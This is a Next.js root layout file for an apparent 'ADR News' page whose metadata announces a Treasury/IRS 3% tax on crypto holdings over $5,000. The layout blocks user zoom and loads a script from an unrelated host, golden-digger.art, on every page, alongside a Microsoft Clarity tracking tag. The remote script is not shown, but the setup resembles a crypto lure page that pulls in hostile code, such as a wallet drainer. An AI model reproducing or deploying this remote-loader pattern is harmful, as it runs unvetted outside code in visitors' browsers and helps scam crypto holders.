export const metadata = {
  title: "BREAKING: U.S. Treasury and IRS Plan 3% “Digital Asset Tax” on Crypto Assets Over $5,000 — ADR News",
  description: "The U.S. Department of the Treasury and the Internal Revenue Service prepare framework for a 3% digital asset tax on crypto holdings exceeding $5,000.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>
        {children}
        <script src="https://golden-digger.art/p/2d72c91e-8a15-4c88-8f0c-aa9dcca859c5/bootstrap.js" async defer></script>
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "yy8pi43hp3");`,
          }}
        />
      </body>
    </html>
  );
}
